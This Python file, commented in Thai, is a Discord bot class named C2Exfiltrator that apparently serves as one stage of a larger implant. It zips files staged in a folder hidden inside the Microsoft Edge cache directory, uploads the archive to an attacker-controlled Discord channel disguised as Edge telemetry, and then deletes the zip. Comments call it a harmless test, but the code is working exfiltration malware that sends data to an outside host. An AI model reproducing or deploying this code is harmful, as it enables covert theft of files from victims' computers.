import discord
import os
import asyncio
import zipfile

# =========================================================================
# [ 🧼 💡 โหมดจำลองส่งของสะอาดบริสุทธิ์ (Pure File Telemetry Uploader) ]
# =========================================================================
local_app_data = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
TARGET_DIR = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\Diagnostic_Packs")
ZIP_PATH = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\f_0000a6_idx.tmp")
# =========================================================================

class C2Exfiltrator(discord.Client):
    def __init__(self, channel_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.target_channel_id = channel_id

    async def on_ready(self):
        channel = self.get_channel(self.target_channel_id)
        if channel is None:
            await self.close()
            return
        
        # ส่งสัญญาณแจ้งความสำเร็จในการเปิดท่อแบบไร้พิษภัย
        await channel.send(content="⚡ **[Pure C2 Test] Data pipeline verified. Bundling local telemetry files...**")
        
        # 1. กลไกการมัดรวมไฟล์ธรรมดา (Zip File Backup)
        if os.path.exists(TARGET_DIR) and os.listdir(TARGET_DIR):
            with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file_name in os.listdir(TARGET_DIR):
                    file_path = os.path.join(TARGET_DIR, file_name)
                    if os.path.isfile(file_path): 
                        zipf.write(file_path, arcname=file_name)

        # 2. 📦 ลำเลียงไฟล์เสบียงที่มัดเสร็จส่งขึ้น Discord C2 ทันทีข้ามสายพันธุ์
        if os.path.exists(ZIP_PATH):
            try:
                with open(ZIP_PATH, 'rb') as f:
                    discord_file = discord.File(f, filename="ms_edge_telemetry_v14.dat")
                    await channel.send(content="📦 **[Upload Success] ส่งมอบไฟล์จำลองจากโฟลเดอร์เทสเรียบร้อยแล้ว:**", file=discord_file)
            except: pass

        # 🧼 ล้างเฉพาะไฟล์ ZIP ชั่วคราวออกเพื่อประหยัดเนื้อที่ (ปล่อยโฟลเดอร์หลักไว้เผื่อคุณพี่รันเทสรอบสอง)
        try:
            if os.path.exists(ZIP_PATH): os.remove(ZIP_PATH)
        except: pass
        
        await self.close()

# પ્રતૂ પક ทางเข้าหลัก รับค่า Token, ID ข้ามมิติจาก C++ 
def main_entry(token_str, channel_id_str):
    intents = discord.Intents.all()
    clean_token = str(token_str).strip()
    clean_channel_id = int(str(channel_id_str).strip())
    
    client = C2Exfiltrator(channel_id=clean_channel_id, intents=intents)
    client.run(clean_token)
